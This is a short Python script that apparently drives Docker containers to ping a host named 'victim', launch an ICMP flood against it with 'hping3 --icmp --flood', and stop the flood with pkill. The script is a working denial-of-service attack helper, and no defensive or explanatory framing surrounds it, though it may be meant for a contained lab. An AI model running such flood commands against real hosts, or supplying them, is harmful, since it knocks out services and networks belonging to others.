import docker 

client = docker.from_env()

def ping(container_id):
  container = client.containers.get(container_id)
  result = container.exec_run('ping -c 4 victim')
  print(result.output.decode())

def icmp_flood(container_id):
  container = client.containers.get(container_id)
  result = container.exec_run('hping3 --icmp --flood victim')
  print(result.output.decode())

def stop_hping(container_id):
  container = client.containers.get(container_id)
  result = container.exec_run('pkill hping3')
  print("Flood attack stopped")